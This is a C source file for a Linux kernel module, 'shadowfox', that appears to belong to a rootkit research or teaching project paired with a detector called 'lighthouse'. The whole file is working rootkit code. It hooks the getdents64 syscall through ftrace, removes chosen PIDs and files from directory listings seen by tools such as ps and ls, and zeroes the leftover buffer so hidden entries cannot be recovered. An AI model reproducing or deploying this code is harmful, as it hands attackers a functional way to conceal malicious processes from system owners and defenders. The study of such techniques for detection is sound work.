// SPDX-License-Identifier: GPL-2.0
/*
 * shadowfox: process concealment via ftrace hook on
 * __x64_sys_getdents64 — the canonical "rootkit hooks a syscall"
 * demonstration.
 *
 * Mechanism (Diamorphine pattern, modernised with ftrace):
 *
 *   1. The reusable wrapper in ftrace_hook.c registers our handler
 *      on __x64_sys_getdents64. Whenever userspace calls getdents64
 *      (the syscall path used by `ls`, `find`, `ps`, etc.), our
 *      replacement runs first.
 *   2. The replacement invokes the original through the saved
 *      function pointer. ftrace_hook.c's recursion guard detects
 *      that the parent_ip is in our module text and lets that call
 *      pass through, so the real syscall populates the user buffer.
 *   3. We copy the buffer to kernel memory, walk the
 *      struct linux_dirent64 stream, and drop entries whose numeric
 *      filename matches a hidden PID. The shrunken buffer is copied
 *      back and the new (smaller) byte count is returned.
 *
 * Important scope note documented in the writeup: this hook fires
 * only on the SYSCALL path. In-kernel users of iterate_dir() bypass
 * us entirely. lighthouse's cross-view PID detector uses
 * iterate_dir and therefore CANNOT catch this technique by design.
 * lighthouse's ftrace-ops walker (detect_hooks.c) catches us
 * through a different signal: it sees an ftrace_ops registered on
 * a syscall function and flags the owning module.
 *
 * Locking: the hidden-PID list is protected by a spinlock. Reads
 * (the membership check on every dirent) and writes (debugfs
 * commands) both take it briefly. The list is small in any
 * realistic demo, so linear scan is fine.
 *
 * Performance: every getdents64 call now does an extra
 * kvmalloc + copy_from_user + scan + copy_to_user. PID-shaped
 * names are cheap to reject (we bail on the first non-digit).
 * Real-world impact: negligible on a TCG-emulated VM.
 *
 * References: Diamorphine (m0nad), Reptile (f0rb1dd3n).
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

/*
 * <linux/types.h> must precede <linux/dirent.h>: in 6.6 the latter
 * uses u64/s64 without pulling in types itself.
 */
#include <linux/types.h>
#include <linux/dirent.h>

#include <linux/errno.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/mm.h>
#include <linux/printk.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#include "ftrace_hook.h"
#include "hide_files.h"
#include "hide_proc.h"

struct hidden_pid {
	pid_t			pid;
	struct list_head	link;
};

static LIST_HEAD(hidden_pids);
static DEFINE_SPINLOCK(hidden_pids_lock);

/* Filled by sf_ftrace_hook_install via .original_pp. */
static long (*orig_sys_getdents64)(const struct pt_regs *regs);

static bool name_is_hidden_pid(const char *name, int namelen)
{
	struct hidden_pid *h;
	char buf[16];
	int pid;
	bool found = false;
	int i;

	if (namelen <= 0 || namelen >= (int)sizeof(buf))
		return false;

	/* PID dirs in /proc/ have all-digit names; reject quickly. */
	for (i = 0; i < namelen; i++) {
		if (name[i] < '0' || name[i] > '9')
			return false;
	}

	memcpy(buf, name, namelen);
	buf[namelen] = '\0';
	if (kstrtoint(buf, 10, &pid) || pid <= 0)
		return false;

	spin_lock(&hidden_pids_lock);
	list_for_each_entry(h, &hidden_pids, link) {
		if (h->pid == pid) {
			found = true;
			break;
		}
	}
	spin_unlock(&hidden_pids_lock);
	return found;
}

static long sf_hooked_sys_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 __user *user_buf;
	struct linux_dirent64 *kbuf;
	long orig_total, total, offset, retval;

	/* Let the real syscall populate the user buffer. */
	orig_total = orig_sys_getdents64(regs);
	if (orig_total <= 0)
		return orig_total;

	user_buf = (struct linux_dirent64 __user *)regs->si;

	kbuf = kvmalloc(orig_total, GFP_KERNEL);
	if (!kbuf)
		return orig_total;  /* Best-effort: leak rather than corrupt. */

	if (copy_from_user(kbuf, user_buf, orig_total)) {
		kvfree(kbuf);
		return orig_total;
	}

	total = orig_total;
	offset = 0;
	while (offset < total) {
		struct linux_dirent64 *ent =
			(struct linux_dirent64 *)((char *)kbuf + offset);
		unsigned short reclen = ent->d_reclen;
		int max_name = reclen - offsetof(struct linux_dirent64, d_name);
		int namelen;

		if (reclen == 0 || offset + reclen > total) {
			/* Malformed; abort filtering, return original. */
			kvfree(kbuf);
			return orig_total;
		}

		namelen = strnlen(ent->d_name, max_name);
		if (name_is_hidden_pid(ent->d_name, namelen) ||
		    sf_files_should_hide(ent->d_name, namelen)) {
			memmove(ent, (char *)ent + reclen,
				total - offset - reclen);
			total -= reclen;
		} else {
			offset += reclen;
		}
	}

	if (copy_to_user(user_buf, kbuf, total)) {
		retval = -EFAULT;
	} else {
		retval = total;
		/*
		 * Zero the tail so a paranoid reader who walks past the
		 * returned count cannot recover the filtered entries.
		 */
		if (retval < orig_total)
			(void)clear_user((char __user *)user_buf + retval,
					 orig_total - retval);
	}

	kvfree(kbuf);
	return retval;
}

static struct sf_ftrace_hook getdents64_hook = {
	.name		= "__x64_sys_getdents64",
	.replacement	= sf_hooked_sys_getdents64,
	.original_pp	= (void **)&orig_sys_getdents64,
};

int sf_proc_init(void)
{
	return sf_ftrace_hook_install(&getdents64_hook);
}

void sf_proc_exit(void)
{
	sf_ftrace_hook_remove(&getdents64_hook);
	sf_proc_clear_hidden();
}

int sf_proc_hide_pid(pid_t pid)
{
	struct hidden_pid *new_entry, *h;

	if (pid <= 0)
		return -EINVAL;
	if (pid == 1)
		return -EPERM;  /* Refuse to hide init. */

	new_entry = kzalloc(sizeof(*new_entry), GFP_KERNEL);
	if (!new_entry)
		return -ENOMEM;
	new_entry->pid = pid;

	spin_lock(&hidden_pids_lock);
	list_for_each_entry(h, &hidden_pids, link) {
		if (h->pid == pid) {
			spin_unlock(&hidden_pids_lock);
			kfree(new_entry);
			return -EEXIST;
		}
	}
	list_add(&new_entry->link, &hidden_pids);
	spin_unlock(&hidden_pids_lock);

	pr_info("hiding pid=%d from /proc/ getdents64 enumeration\n", pid);
	return 0;
}

int sf_proc_show_pid(pid_t pid)
{
	struct hidden_pid *h, *tmp;
	bool found = false;

	spin_lock(&hidden_pids_lock);
	list_for_each_entry_safe(h, tmp, &hidden_pids, link) {
		if (h->pid == pid) {
			list_del(&h->link);
			kfree(h);
			found = true;
			break;
		}
	}
	spin_unlock(&hidden_pids_lock);

	if (!found)
		return -ENOENT;

	pr_info("showing pid=%d (no longer hidden)\n", pid);
	return 0;
}

void sf_proc_clear_hidden(void)
{
	struct hidden_pid *h, *tmp;
	int count = 0;

	spin_lock(&hidden_pids_lock);
	list_for_each_entry_safe(h, tmp, &hidden_pids, link) {
		list_del(&h->link);
		kfree(h);
		count++;
	}
	spin_unlock(&hidden_pids_lock);

	if (count > 0)
		pr_info("cleared %d hidden pid entries\n", count);
}
